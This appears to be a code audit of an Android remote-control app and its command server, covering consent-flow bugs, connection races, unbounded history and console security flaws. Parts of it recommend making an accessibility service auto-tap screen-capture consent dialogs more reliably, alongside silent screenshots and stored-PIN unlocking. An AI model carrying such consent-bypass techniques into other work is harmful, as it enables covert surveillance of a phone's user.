- `ScreenCapturer.stop()` (`ScreenCapturer.kt:277-299`) does not call `ProjectionHub.stop()`. Only `screen off` (`CommandHandler.kt:181-189`) and `GhostService.onDestroy()` (`GhostService.kt:99`) stop it.
- Result: a projection shot fallback, a finished `screen record`, or a `screen stop` leaves the cast chip/projection alive. This directly violates “no persistent projection; consent per capture/session.”

**Minimal exact change**
- Make ownership session-scoped: `ensureProjection(ctx, sessionToken)`, store `projectionToken`, reuse only when tokens match; otherwise stop the stale projection and request fresh consent.
- Add `stopIf(p, token)`; call it in the normal shot/stream outer `finally`.
- Make `ScreenCapturer.stop()` call `ProjectionHub.stop()`; make `screen stop` release the projection (then `screen off` is an alias). Update the contradictory docs at `CommandHandler.kt:155-160`.
- Add `GhostService.demoteFromProjection()` and call it after projection stop. On Android 14+ leaving the FGS typed `mediaProjection` is not a clean release. *(Demote behavior on the actual device is unverified.)*

## P0 — consent latch can wedge permanently (verified)

In `ProjectionHub.awaitGrant()`:
- timeout (`:142-143`), stop-cancel (`:145`), and interrupt (`:151-153`) all throw **before** `grantLatch = null` at `:148`.
- `stop()` (`:174-180`) counts down but never nulls the latch.
- After a timeout the stale latch has count 1, so the next `ensureProjection` sees `grantLatch != null` at `:123`, does not start a new dialog, and waits another 120 s. After `stop()`, the stale latch + `grantCancelled=true` makes every later call fail immediately. Only process restart recovers.

Also verified:
- `ctx.startActivity()` runs while holding `hubLock` (`:128-135`); `stop()` needs the same lock (`:175`), so a blocked activity start can block `screen stop`/`screen off`.
- There is no request identity; a late result from an old/destroyed `ScreenCaptureActivity` can satisfy a new latch.
- `grantWaiter` is one field; an old waiter’s `finally` (`:155`) can clear a new waiter.
- The follower poll loop (`:66-84`) has no deadline.

**Minimal exact change**
- Add a `grantToken`; pass it as `EXTRA_GRANT_TOKEN` to `ScreenCaptureActivity`; `onGrant(token, code, data)` ignores mismatches; `stop()` increments the token to invalidate late results.
- Clear the latch on every non-success path in `awaitGrant`’s `finally`, and only null `grantWaiter` when it is the current thread.
- Move `startActivity` outside `synchronized(hubLock)`; clear the latch on failure.
- In `stop()`, under the lock: set cancelled, increment token, count down and null the latch, capture the waiter, capture/clear projection/token; then interrupt only that waiter and stop the projection outside the lock.
- After `getMediaProjection`, validate the token under the lock; stop a late projection instead of installing it.
- Add a follower deadline (`GRANT_TIMEOUT_S + ~10 s`).

## P0 — consent activity has no cancellation path (verified)

`ScreenCaptureActivity.kt`:
- no `onDestroy` cancellation; if the activity is destroyed without a result (background-start block, keyguard, system kill), the latch waits 120 s.
- no `setShowWhenLocked(true)` / `setTurnScreenOn(true)`; a consent UI launched while locked/screen-off may be hidden or blocked.
- all failures collapse to “denied by user” (`:37-40`, `:45`), hiding “cannot show consent dialog” / “activity destroyed.”

**Minimal exact change**
- Add a `handled` flag; in `onDestroy`, if `!handled`, call `onGrant(token, 0, null)` or a distinct `onGrantError(token, "...")`.
- Set `setShowWhenLocked(true)` and `setTurnScreenOn(true)` on API 27+.
- Carry the grant token in the intent and return it from `onActivityResult`.

## P1 — auto-confirm can blind-tap the keyguard and other SystemUI (verified)

`GhostAccessibilityService.autoConfirm()` (`:151-178`):
- filters only by package prefix (`:158-159`). `com.android.systemui` also hosts the keyguard, notification shade, and volume panel.
- no activity/class gating and no keyguard check. With `armed = true`, `CONFIRM_TEXTS` includes `"ok"`, `"start"`, `"allow"` (`:40-58`), so it can tap an “OK”/“Start”/“Allow” on the lock screen. This is the blind-tap case to avoid.
- no clickable-first preference; a title/description node can be tapped by coordinates.

**Minimal exact change**
- Pass `event` into `autoConfirm`; derive `cls = event.className`.
- Add screen-capture class markers (`MediaProjectionPermissionActivity`, `MediaProjection`, `ScreenCapture`) and require both package + class for the screen-capture path.
- Run the screen-capture path regardless of `armed`; keep the generic installer/permission path `armed`-gated and skip it when `KeyguardManager.isKeyguardLocked`.
- Prefer clickable candidates: `firstOrNull { confirmText(it) && it.clickable } ?: firstOrNull { confirmText(it) }`.
- Use exact/package-dot matching (`pkg == it || pkg.startsWith("$it.")`), not bare `startsWith`.
- Bound attempts (e.g. max 3 per window); reduce/remove the 5 s duplicate-key suppression so back-to-back consent sheets work; keep the 1.2 s throttle.

## P1 — auto-confirm text/selection/armed gaps (verified; exact labels unverified)

- `"start"` is too broad; remove it from the generic list or scope it to the MediaProjection class.
- `"start recording or casting"` will not exact-match the title “Start recording or casting with Ghost?”; the usable button is “Share screen”/“Start now”.
- No `"share"` (if the button is just “Share”); no `"entire screen"` handling for older/OEM pickers.
- The 5 s same-node suppression can ignore a second per-session consent sheet.
- Auto-confirm is entirely `armed`-gated; `ghostd` arms asynchronously (`GhostService.kt:65-72`, `CommandRouter.kt:114-115`), so the first dialog can be missed.
- `createConfigForDefaultDisplay()` (`ScreenCaptureActivity.kt:30-35`) is already correct for API 34+ whole-display default; keep it.

**Minimal exact change**
- Add a bounded screen-capture text list (`share screen`, `share`, `start now`, `start recording`, `entire screen`, `start`) used only when the activity class matches MediaProjection.
- On API ≤33/OEM, if an “Entire screen” node is present, tap it and schedule one bounded `autoConfirm` retry (~400 ms) to hit the confirmation on the next pass. Do not tap a title.
- **Unverified:** the exact Pixel/Android 14 button label (“Share screen” vs “Share”) and whether the “Entire screen” picker appears with `createConfigForDefaultDisplay()`. The class marker is the reliable part; verify labels on-device.

## P1 — force-end ownership races can corrupt the next consent session (verified)

`MediaBus.kt` uses only the source string:
- `end`/`forceEnd` (`:48-98`) and `sendFrame`/`streamStart`/`streamEnd` (`:115-159`) are keyed by `"screen"`.
- After `forceEnd("screen")`, a new screen capture can begin with the same source. The old worker’s later `end("screen")` clears the new slot; its `sendFrame` uses the global `ws` and can send into the new session; its `streamEnd` can terminate the new stream.
- `ScreenCapturer.worker`, `currentDisplay`, `currentReader`, `framesSent`, and `stopRequested` are also global (`ScreenCapturer.kt:47-55`); old cleanup can clobber new state.

**Minimal exact change**
- `MediaBus.begin(...): Long` returns a session token; add token overloads for `end`, `forceEnd`, `isActive`, `isOwner`, `sendFrame`, `streamStart`, `streamEnd`; screen uses tokens, cam/mic keep old overloads.
- `ScreenCapturer` captures the token and uses it for all sends/ends/force-ends.
- Use `MediaBus.isOwner(token)` as the stop authority in `pollFrame` and the stream loop.
- Ownership-check cleanup: `if (worker === t) worker = null`, `if (currentDisplay === vd) currentDisplay = null`, etc.

## P1 — live/external stop and no-frame paths can wedge (verified)

- `MediaProjection.Callback.onStop` only nulls the projection (`ProjectionHub.kt:102-106`). If the user taps “Stop sharing” during open-ended `screen live` (`secs == null`), `runStream` keeps polling forever (`ScreenCapturer.kt:235-258`).
- `stream()`’s no-frames path (`ScreenCapturer.kt:182-188`) throws without stopping the worker or releasing `MediaBus`; for `live` this wedges the screen slot.
- `shot` waits on `done.await(SHOT_BUDGET_S)` (`ScreenCapturer.kt:84`); `stop()` only interrupts the worker, so a wedged worker leaves the command waiting up to 135 s.
- `GhostService.onDestroy()` only calls `ProjectionHub.stop()` (`:99`); it does not stop the capture worker or force-end MediaBus.

**Minimal exact change**
- Callback: identity-check under lock, null projection/token, demote FGS, call `ScreenCapturer.requestStopOnly()`.
- No-frames path: call `stop()` (or explicit teardown + `ProjectionHub.stop()` + `forceEnd(token)` + `streamEnd`) before throwing.
- Add a `shotDone` latch; `stop()`/`forceStop()` counts it down; after the wait, if no result/error, throw “screen shot stopped.”
- Add a non-blocking `ScreenCapturer.forceStop()` for `GhostService.onDestroy`.
- Emit `streamEnd(stream, token, "error/stopped")` on failure paths.

## P2 — locked-screen gating and silent-shot fallback (verified)

- `CommandHandler` has no keyguard check in `screenCmd`; `screen record`/`live` while locked will request consent behind the keyguard or get blocked. Reuse the existing `unlockWithStoredPin(ctx)` (`CommandHandler.kt:342-355`) or fail fast with “device locked; unlock first.”
- `silentScreenShot()` (`:141-153`) falls back to MediaProjection on every accessibility failure, including `"throttled"` and locked/secure-window errors. For burst stills this now means a per-shot consent dialog.
  - Retry accessibility once after ~450 ms on `"throttled"`.
  - Do not fall back on locked/secure-window errors.
- `GhostAccessibilityService.screenshot()` leaks the hardware buffer if `wrapHardwareBuffer`/`copy` throws (`:431-439`); a late bitmap after the 8 s timeout (`:456`) is not recycled. Use `try/finally { hb.close() }`, a `timedOut` flag, and add a secure-window error mapping.

## P2 — smaller verified issues

- `ProjectionHub.stop()` reads/clears `projection` outside `hubLock` (`:182-183`); do that under the lock and stop outside. The callback also lacks identity/lock checks.
- `GhostService.promoteToProjection()` swallows failures (`:110-122`); on Android 14+ that hides the real reason `getMediaProjection` fails. Log/return a Boolean.
- `ScreenCapturer.shotInternal()` does not recycle its bitmap (`:120-129`); both image listeners use unbounded queues (`:102-108`, `:209-215`). Recycle and drain/close queued images on teardown.
- The notification fallback (`GhostService.kt:377-383`) starts `ScreenCaptureActivity` without a grant token. With a token design, accept token `0` only as a manual override while a latch is pending, or rebuild the PendingIntent with the active token.
- `CommandRouter.kt` has no consent bug: `screenshot` is the silent accessibility path (`:89-91`); `arm`/`disarm` only control the generic auto-confirm (`:114-115`). If the MediaProjection auto-confirm becomes always-on, no router change is needed beyond optional `status` text updates.

## Unverified / device-dependent

- Exact Pixel/Android 14 screen-capture activity class and button labels. I verified the package/class pattern only from code; confirm the actual class contains `MediaProjection`.
- Whether the MediaProjection consent dialog can be shown/completed while the device is locked, even with `showWhenLocked`. Recommend failing fast or unlocking first rather than relying on it.
- Whether `SYSTEM_ALERT_WINDOW` is actually granted at runtime. The manifest declares it, but a blocked background activity start would still time out.
- Android 14 FGS type demotion behavior after `startForeground` with only `dataSync`.
- Whether the server tolerates duplicate/late `stream_end` or frame sequences; the token fix prevents the client from emitting them, but server behavior was not reviewed.
- `GhostService` lines 131-371 (C2 loop) were not reviewed; they are outside the consent flow.

---


# Server / console / CLI audit

I reviewed `server/daemon.py`, `server/console.py`, and `server/ghostctl.py` statically. I did not review `push_file`/`_push_file` or the file-transfer framing, per the exclusion; the `update`/APK path is mentioned only where it affects command/console/CLI behavior.

Below, **Confirmed** means the defect is visible in the code as written; **Hardening** means the behavior is a design/exposure risk without a single clear bug.

## Highest-priority items

1. Unauthenticated hello creates persistent in-memory device records (memory/listing DoS).
2. `MAX_PENDING` enforcement is inverted; new enrollments bypass the cap.
3. Timed-out and failed-send commands leak `self.pending` entries.
4. `ws.send` has no timeout; one stalled device can hang a dispatch or an entire broadcast indefinitely.
5. `history.json` is unbounded and rewritten in full twice per command; large base64 results are persisted.
6. Admin port has no authentication and `list`/`pending` return device bearer tokens.
7. Revoke does not close the active device connection or drop its streams.
8. Old websocket is not closed when a device reconnects; zombie messages are still processed.
9. Console POST endpoints have no CSRF protection; GET `/stream/.../feed.mjpg` is a long-lived, CSRF-reachable resource sink.
10. Console has an XSS via `device_id` in the inline `onclick` confirm strings.

---

## A. Device connection replacement/cleanup

### A1. Old websocket is never closed on replacement — **Medium-High, Confirmed**
`daemon.py` `device_handler` (lines 527-534).

**Failure:** A device loses its network without a TCP FIN. It reconnects and sends a valid hello. `self.conns[device_id] = ws` overwrites the old websocket object, but the old connection is never closed. Its `async for raw in ws` loop remains alive until the websocket keepalive notices (~40s with default `ping_interval`/`ping_timeout`). During that window the old handler still counts against `ip_conns`, still consumes a task/socket, and still processes messages (see A2).

**Smallest fix:** after deciding the hello, capture the previous ws, assign the new ws, and close the old without blocking the hello path: `old = self.conns.get(did); self.conns[did] = ws; if old and old is not ws: asyncio.create_task(old.close())`. Keep the existing `conns.get(device_id) is ws` guard in the `finally`.

### A2. Zombie/superseded connection messages are still processed — **Medium, Confirmed**
`daemon.py` `device_handler` message branches (lines 539-558), especially `stream_start`/`stream_end` and `result`.

**Failure:** The old connection is still registered in its own handler scope. If the device (or a buggy client) sends a late `stream_end` on the old connection after the new connection started a stream, line 551 calls `self.streams.drop(device_id, ...)` and wipes the new stream's cache. A late `ping`/`info` updates `last_seen`/battery/IP from the zombie. A late `result` can satisfy a command whose `cmd_id` the old connection knows.

**Smallest fix:** after the hello handling, ignore non-hello messages unless this ws is current: `if self.conns.get(device_id) is not ws: continue`. If preserving results from a command sent on the old ws matters, store the target ws in the pending rec and accept the result only for that rec (or accept `result` by `cmd_id` but guard only `stream_*`/`ping`/`info`). Closing the old ws (A1) removes most of the window.

### A3. Per-IP limit counts zombie connections and blocks legitimate reconnects — **Medium, Confirmed**
`daemon.py` `device_handler` per-IP check (lines 499-504) and `finally` (lines 560-562).

**Failure:** A flapping device reconnects from the same NAT IP while its old connections linger as zombies. Each new connection increments `ip_conns[ip]`; the old ones do not decrement until their handlers exit. Once the count reaches `MAX_PER_IP` (default 5), the next reconnect is dropped *before the hello*, so it cannot replace its own zombie. The device is locked out until the websocket keepalive closes the zombies. Other devices behind the same NAT are also denied.

**Smallest fix:** track the ws objects per IP (a set rather than a count) and when the limit is reached evict the oldest ws from that IP instead of dropping the new connection; or reduce `ping_interval`/`ping_timeout` in `websockets.serve` to shrink the zombie window; or allow a connection whose hello identifies an already-connected `device_id` to proceed and close its old ws. The set-based eviction is the most targeted.

### A4. Unauthenticated hello creates a device record before credential checks — **High, Confirmed**
`daemon.py` `handle_hello` (line 471).

**Failure:** `rec = self.devices.setdefault(did, {})` runs before token/enroll-key validation. An attacker connecting to the device port (default `0.0.0.0:8443`) sends `{"type":"hello","device_id":"<arbitrary>"}` with no credentials. The hello is denied, but the empty record remains in memory. Repeating over connections (or with many IPs) grows `self.devices` without bound. Those empty dicts are returned by `device_list()` and counted by `pending_ids()` (line 326-327: `not rec.get("approved")` is true for `{}`), so they pollute the console/CLI list, inflate the pending count, and make every later `pending_ids()` scan slower. A multi-KB `device_id` string also grows memory; a non-str/unhashable id raises and kills the connection handler.

**Smallest fix:** do not create on failure. Use `existing = self.devices.get(did)`; validate `isinstance(did, str) and 0 < len(did) <= 128`; only assign `self.devices[did] = rec` after credentials pass. The caller's `touch` already creates on success.

### A5. `MAX_PENDING` condition is inverted — **High, Confirmed**
`daemon.py` `handle_hello` (lines 481-486).

**Failure:** `was_pending = not rec.get("approved")` is `True` for a brand-new device (empty dict). The guard is `if not was_pending and len(self.pending_ids()) >= max_pending`, so the cap is skipped exactly for *new* enrollments and applied only when an already-approved device re-enrolls with the enroll key. With a valid (shared or leaked) enroll key, an attacker enrolls unique `device_id`s indefinitely; `self.devices` grows and every `touch` persists an ever-larger `state.json`. The documented "at most MAX_PENDING pending devices" never triggers.

**Smallest fix:** compute `is_new = did not in self.devices` (or `not rec`) and enforce `if is_new and len(self.pending_ids()) >= self.config["max_pending"]: deny`; create the record only after the check passes. Because `handle_hello` currently has no `await`s, doing the check and record creation synchronously there also closes the check-vs-touch race described in G4. Fix A4 first, or the empty-record inflation will cause false denials.

### A6. Revoke does not close the device connection or clear its stream cache — **Medium-High, Confirmed**

> **Status 2026-10-26:** fixed in the revocation path. `_revoke_access` closes
> the socket, drops streams and transfers, fails outstanding commands, rotates
> the token and marks the device unapproved.
`daemon.py` `admin_dispatch` "revoke" (lines 612-620).

**Failure:** An operator revokes a compromised device. `touch(..., approved=False, token=new_token)` updates the registry, but the device's existing websocket remains in `self.conns`, remains "online" in the console, and can keep sending `ping`/`info`/`result`/`stream_*`. Its cached camera/screen stream continues to be served by `stream_frame` until the device itself disconnects. The token rotation only prevents a future reconnect.

**Smallest fix:** in the revoke branch, after the state update: `ws = self.conns.pop(did, None); if ws: await asyncio.wait_for(ws.close(), timeout=5); self.streams.drop_device(did)`. The handler's existing `conns.get(did) is ws` guard prevents double cleanup.

### A7. Reconnect registration and state update happen after the ack send — **Medium, Confirmed**
`daemon.py` `device_handler` (lines 519-534).

**Failure:** `handle_hello` is awaited and returns a decision; the code then `await ws.send(ack)`; only afterwards does it set `conns[did]` and call `touch`. The send yields. Two simultaneous hellos for the same device (one valid token, one enroll key) both read the pre-send state; the order in which their `touch` calls resume is non-deterministic, so the final `approved`/`token` can flip. Also, a command arriving during the send window sees the old `approved` value and the old ws (or no ws) — a small TOCTOU where a command is sent to a device that is transitioning to pending or to the wrong connection.

**Smallest fix:** register and update state synchronously *before* sending the ack: decide in `handle_hello`, then `old = self.conns.get(did); self.conns[did] = ws; self.touch(...)` (no await between), close the old (A1), then `await ws.send(ack)`. The `finally` still cleans up if the send fails. The approved-vs-enroll decision is then atomic with the registry update.

### A8. Enroll-key hello can de-approve an approved device without closing its active connection — **Medium-High, Confirmed + design risk**

> **Status 2026-10-26:** fixed. An approved device re-enrolling with only the
> shared key is denied; token loss requires explicit `revoke` and re-approval.
> The shared enrollment key remains a residual risk (see F9).
`daemon.py` `handle_hello` enroll path (lines 477-488) and `touch` at hello (lines 528-534).

**Failure:** A device loses its token and re-enrolls with the valid enroll key. `handle_hello` returns `pending` with a new token; `touch` sets `approved=False` and overwrites the token. The already-approved connection is not closed. The operator's next command fails "pending approval"; the device is effectively cut off until re-approved. Conversely, an attacker holding the shared enroll key can open a second session for an approved device and force it into pending — a targeted DoS/confusion. If the two hellos race (A7), the final state is non-deterministic.

**Smallest fix:** for an already-approved device, reject the enroll-key path unless the device has been explicitly revoked (return denied + log), or close the existing approved ws and set pending consistently. The former is the smaller safe change; document that a lost token requires `revoke` first. The shared global enroll key remains a design risk (hardening).

### A9. `MAX_PER_IP`/`MAX_PENDING` config accepts 0/negative values — **Medium, Confirmed**
`daemon.py` `admin_dispatch` "config" (lines 621-636).

**Failure:** `ghostctl config set max_per_ip 0` (or a CSRF/authenticated admin request) sets the device listener to drop every connection at line 499. `max_per_ip -1` does the same. The daemon is bricked for device connections until `config.json` is edited or the daemon restarted. `max_pending 0` blocks all new enrollments. There is no upper bound either, so a huge value defeats the flood protection.

**Smallest fix:** validate the parsed integer range in the "config" branch (`max_per_ip >= 1`, `max_pending >= 1`, with a sane upper bound) and reject with an error before mutating `self.config`/`config.json`.

---

## B. Pending command timeout/cancellation

### B1. Timed-out commands leak `self.pending` — **High, Confirmed**
`daemon.py` `dispatch` (lines 344-359).

**Failure:** A command is sent to an online approved device that ignores it. `asyncio.wait_for` times out, the history entry becomes `"timeout"`, but `self.pending[cmd_id]` is never removed. The rec (with its `asyncio.Event` and possibly a late `result`) stays in memory. Repeating commands grows `self.pending` without bound. A late result may pop it by accident, but there is no guarantee.

**Smallest fix:** wrap the send + wait in `try/finally` and `self.pending.pop(cmd_id, None)` in the `finally`; set `entry["status"] = "timeout"` on the timeout path as now. If preserving late results matters, keep a separate short-TTL `cmd_id -> history entry` map rather than retaining the event.

### B2. Send failure leaves a leaked rec and a permanently `"pending"` history entry — **High, Confirmed**
`daemon.py` `dispatch` (lines 350-351; the `try` starts at 352).

**Failure:** A device disconnects between the approved/conns checks and `await ws.send(...)`. The send raises outside the `try`; the exception propagates to `admin_dispatch`'s outer handler and is returned as an error. The rec added at line 345 is never popped, and the history entry appended at line 348 and persisted at line 349 remains `"pending"` forever. The console shows a command stuck in pending.

**Smallest fix:** move `await ws.send(...)` inside the `try` (and the `finally` from B1); on send exception set `entry["status"]="error"`, `entry["result"]={"error": ...}`, persist, and pop the rec. This also makes a broadcast's many failed sends clean up.

### B3. No send timeout; a stalled device blocks dispatch and broadcast — **High, Confirmed**
`daemon.py` `dispatch` (line 350); `broadcast` (lines 367-369) inherits it.

**Failure:** A device stops reading its websocket (TCP backpressure). `ws.send` awaits the transport drain and never returns. The admin request hangs; a broadcast's `asyncio.gather` waits for that device forever even though each dispatch's `wait_for` only wraps the event wait. The CLI's socket times out and disconnects, but the server task remains blocked and the pending rec leaks. Repeated broadcasts accumulate blocked tasks.

**Smallest fix:** `await asyncio.wait_for(ws.send(...), timeout=5)` (and for the hello ack/pong sends in `device_handler`); on `TimeoutError`, close the ws and treat the device as offline. Also wrap broadcast's sends in the same timeout via the shared dispatch path.

### B4. No cleanup of pending commands when a device disconnects — **Medium-High, Confirmed**
`daemon.py` `device_handler` `finally` (lines 559-566) and `dispatch`.

**Failure:** A device disconnects mid-command. Its dispatch continues waiting the full `wait` (10s default, 120s for update install). The operator waits unnecessarily; the rec leaks if the wait times out. For long waits this is a noticeable hang.

**Smallest fix:** add `"device_id": device_id` to the rec; in the disconnect `finally`, iterate `self.pending` and for recs matching the device set `rec["ok"]=False`, `rec["result"]={"error":"device disconnected"}`, `rec["event"].set()`, then pop them. The dispatch's `finally` also pops as a backstop. A device->recs index is optional; `self.pending` is normally small once B1 is fixed.

### B5. Cancellation is not propagated; client disconnect leaves the command running — **Medium, Confirmed/Hardening**
`daemon.py` `admin_handler` (lines 569-586) and `dispatch`.

**Failure:** A CLI `Ctrl-C`, socket timeout, or closed console tab does not cancel the daemon-side dispatch. The handler is awaiting `dispatch`; it only notices the close on the next `writer.write`/`drain`. The device may still execute a long/destructive command; the operator may retry and duplicate it. True cancellation (e.g., a "cancel" op) is absent.

**Smallest fix:** run the dispatch as a task and concurrently watch the admin reader for EOF; on EOF cancel the task and mark the entry `"cancelled"` (moderate change). As a smaller partial fix, keep the dispatch bounded by B3's send timeout and B1's cleanup, and document that closing the client does not stop the device command. Avoid adding a new cancel protocol unless required.

### B6. Late result after timeout is not recorded — **Medium, Hardening/Confirmed**
`daemon.py` `dispatch` timeout path (lines 356-357) and `result` handler (lines 552-558).

**Failure:** A command times out; the device later completes and sends a result. If B1's fix pops the rec on timeout, the result is silently dropped. The history says `"timeout"` even though the device acted. The operator retries, causing duplicate execution. Without B1's fix, the result pops the rec but the history still says `"timeout"`.

**Smallest fix:** on timeout, keep a short-TTL `cmd_id -> history entry` mapping (e.g., 60s); when a result arrives for a timed-out id, update `entry["status"]`/`entry["result"]` and persist. If the simplest cleanup (pop on timeout) is chosen, document that late results are discarded.

### B7. Default `--wait` is too short for documented long commands — **Medium, Confirmed**
`ghostctl.py` `main` default `--wait` (line 162); `console.py` `rpc_command`/`rpc_broadcast` wait (lines 155-164, 443, 450); `daemon.py` `dispatch` default (line 334).

**Failure:** `ghostctl -d x screen shot` uses wait 10s; the docstring at ghostctl.py lines 60-61 says the consent flow can take 60s+. The daemon times out at 10s; the device later sends a result that is dropped; the operator sees "timeout" and retries. The console's forms use 20s and hit the same for consent/recording. Long-lived `screen live`/`cam live`/`mic live` commands can also outlast the wait and show as timeouts despite starting successfully.

**Smallest fix:** set per-verb waits in the CLI/console (e.g., 60s+ for screen shot, cam snap, mic record, screen record; a short "started" wait or non-blocking semantics for live commands). Keep the daemon's `wait` as the request value. This is a small mapping change, not a new protocol.

### B8. `wait` is unbounded and client-controlled — **Medium, Confirmed/Hardening**
`daemon.py` `admin_dispatch` "command" (line 654); `ghostctl.py` `--wait`.

**Failure:** A local/authenticated client sends `{"op":"command","device_id":"...","wait":1e9}`. The admin handler awaits for that long; if the device never responds, the task and pending rec remain. Repeated requests exhaust tasks/memory. The CLI's `--wait` similarly produces a huge socket timeout and an indefinite hang.

**Smallest fix:** clamp the wait in `admin_dispatch`/`dispatch` (e.g., `max(0, min(wait, 300))`) and reject non-finite/negative values. This also bounds the CLI's socket timeout derivation.

---

## C. History/state persistence

### C1. `history.json` grows without bound and is fully rewritten twice per command — **High, Confirmed**
`daemon.py` `dispatch` (lines 346-349, 358) and `persist_history` (lines 308-309); `console.py` `load_history` (lines 137-141).

**Failure:** Every command appends an entry and calls `save_json`, which serializes the entire list to a temp file and renames it; then the final status triggers another full rewrite. A broadcast to N devices does 2N full rewrites. The observed `history.json` is already 6.8 MB. Each write blocks the single event loop; the console reads and parses the whole file on every `/device/<id>` page. Repeated broadcasts/commands cause disk I/O amplification and latency for all devices. At startup, `load_json` loads the whole file into memory.

**Smallest fix:** cap `self.history` (e.g., keep the last 1000 entries) after append and after load; in `broadcast`, append entries and call `persist_history()` once after the gather (add a `persist=False` flag to `dispatch`); optionally rotate/truncate an oversized existing file at startup. These are small, targeted changes.

### C2. Large command results (screen shots) are persisted in history — **High, Confirmed**
`daemon.py` `dispatch` (line 355, `entry["result"] = rec["result"]`) and history persistence; `console.py` `page_device` (line 256) and `page_cmd_result` (line 292).

**Failure:** A `screen shot`/`cam snap` result is a multi-MB base64 PNG. It is stored in `entry["result"]`, persisted to `history.json`, and re-serialized on every later command. The console's device page does `json.dumps(h.get("result"))[:400]` — it builds the entire multi-MB string before slicing — and `page_cmd_result` dumps the full response into HTML. A single screen shot makes the history file large and makes subsequent commands/console pages slow or memory-heavy. A broadcast screen shot multiplies this by device count.

**Smallest fix:** keep the full result in the in-memory response/CLI result, but persist a truncated summary in the history entry (e.g., `{"truncated": True, "bytes": N}` or first few KB); cap the console's display and avoid `json.dumps` of the full result before slicing. This preserves the CLI's ability to retrieve the full result while keeping the file small.

### C3. State/history/`.env` are group/world-readable and contain credentials — **High, Confirmed**
`daemon.py` `save_json` (lines 273-276), `load_dotenv` (lines 78-91), `load_enroll_key` (lines 127-140); observed `server/` directory and file modes.

**Failure:** The observed directory is `775`; `.env`, `state.json`, `history.json`, and `console.log` are `664`; `enroll.key` is `600`. `state.json` contains device tokens; `history.json` contains shell commands, SMS text, and screen/camera base64; `.env` may contain `GHOST_ENROLL_KEY` and `GHOST_CONSOLE_PASS`. A local group/other user can read tokens (impersonate devices), the enroll key (enroll/approve-attack devices), and the console password, and can delete/replace `enroll.key`, `state.json`, or the Python scripts because the directory is group-writable. Even if the operator chmods `state.json` to 600, `save_json` writes a temp file with the process umask (typically 644) and `replace`s it, reverting the permissions on the next write.

**Smallest fix:** set `os.umask(0o077)` at daemon/console startup; in `save_json`, `os.chmod(tmp, 0o600)` before `replace` (and optionally fsync); chmod existing `state.json`, `history.json`, `.env`, `config.json`, `console.log` to 600 and the server directory to 700/750. A startup check that refuses group/world-writable `BASE`/`.env` would prevent regressions. This is a deployment+small-code fix, not a refactor.

### C4. `touch` persists the whole state on every ping/info — **High, Confirmed**
`daemon.py` `touch` (lines 312-319); `ping` (lines 539-542); `info` (lines 543-546).

**Failure:** A device (even a *pending* device, per the comment at line 540) sends `{"type":"ping"}` in a tight loop. Each call updates memory and calls `persist_state()` → `save_json` writes the entire `state.json` synchronously. The event loop blocks for all devices on each write; a single enrolled device can cause a disk/CPU DoS. `info` messages do the same. Every heartbeat rewrites tokens/records to disk.

**Smallest fix:** add `persist=True` to `touch`; call `touch(device_id, online=None, persist=False)` for `ping`/`info`, and persist only on hello/disconnect/approve/revoke/rename (or throttle persistence to at most once per second). The in-memory state remains authoritative; a crash loses at most the last second of heartbeat metadata.

### C5. Persistence failures break commands and connections — **Medium, Confirmed**
`daemon.py` `save_json` (lines 273-276) called from `dispatch` (lines 349, 358) and `touch` (line 319).

**Failure:** Disk full or a permission error makes `save_json` raise `OSError`. In `dispatch`, the first persist (line 349) raises before `ws.send`, so the command is never sent, the rec leaks, and the admin gets an error. In `device_handler`, a `touch` failure at hello or disconnect propagates and drops the device connection. In the final persist, a failure turns a successful command into an error response while the history file stays stale. The temp file may also be left behind.

**Smallest fix:** make `save_json` best-effort: catch `OSError`, log it, and return a boolean; callers continue (commands still execute, connections stay up). Alternatively wrap each call site; the function-level catch is the smallest.

### C6. `load_json` silently discards corrupt state/history — **Low-Medium, Confirmed**
`daemon.py` `load_json` (lines 266-270); `Daemon.__init__` (lines 281-286).

**Failure:** A corrupt/partial `state.json` (operator edit, filesystem issue) makes `load_json` return `{}` with no log. The daemon starts with no devices/tokens; approved devices must re-enroll/re-approve. A corrupt `history.json` starts with an empty history. The operator gets no warning. If `state.json` contains a list/string instead of a dict, line 283's `.values()` raises and the daemon crashes at startup; if `history.json` is not a list, the first command's `.append` raises. If a device record is a non-dict, `touch`'s `.update` raises later.

**Smallest fix:** validate types on load (`dict`/`list`, and each device record `dict`); log a warning and rename the bad file to `.bad` before falling back; trim `self.history` to the cap after load. These are small guards.

### C7. Console reads `history.json` locally even when the daemon is remote — **Medium, Confirmed/Design**
`console.py` `HISTORY_FILE` (line 59), `load_history` (lines 137-141), `page_device` (line 251).

**Failure:** `GHOSTCTL_ADMIN_HOST`/`PORT` point the console at a daemon on another host. Commands execute remotely, but the device page's history is read from `history.json` next to `console.py` — empty or stale. The operator sees no command history while actions succeed. The docstring assumes same-host but the environment supports remote.

**Smallest fix:** document the same-host requirement and refuse/warn when `ADMIN_HOST` is not loopback; or add a small read-only `"history"` admin op (filter by device_id) and have the console use it. The op is a minor addition, not a broad feature.

### C8. Blocking persistence on the event loop — **Medium, Confirmed/Performance**
`daemon.py` `save_json`/`persist_state`/`persist_history` (lines 273-309).

**Failure:** `save_json` is synchronous. With the current 6.8 MB history, each command blocks all device websocket processing and admin requests for the write duration. A screen-shot command can block for a noticeable time; a broadcast multiplies it. This delays device pings and results, causing spurious timeouts and reconnect churn.

**Smallest fix:** the cap/truncation in C1/C2 reduces the size enough to make blocking acceptable. If further needed, wrap the write in `asyncio.to_thread`; that is a small change at the call sites, not a refactor. C1 is the smaller first step.

---

## D. Stream cache cleanup

### D1. `latest(jpeg_only=True)` returns None when the newest frame is PCM — **Medium, Confirmed**
`daemon.py` `StreamCache.latest` (lines 227-245); `admin_dispatch` "stream_frame" (lines 639-647); `console.py` `_fetch_frame` (lines 458-467).

**Failure:** A device runs `mic live` (PCM) and `screen live`/`cam live` (JPEG) concurrently. The newest frame in the cache is PCM. `latest(did, None)` selects the single newest key and then applies `if jpeg_only and not is_jpeg(payload): return None`. The console's `stream_frame` call (no stream name) gets "no cached jpeg frame" even though a valid JPEG stream exists. The stream page shows no signal.

**Smallest fix:** when `jpeg_only` is true, restrict the candidate keys to those whose newest payload is JPEG before selecting `max(..., key=self._last_ts)`; return the newest JPEG stream. A few lines in `latest`.

### D2. No TTL/staleness; frozen frames persist indefinitely — **Medium, Confirmed/Hardening**
`daemon.py` `StreamCache` and `stream_frame` (lines 639-647); `console.py` `stream_mjpg` (lines 479-504).

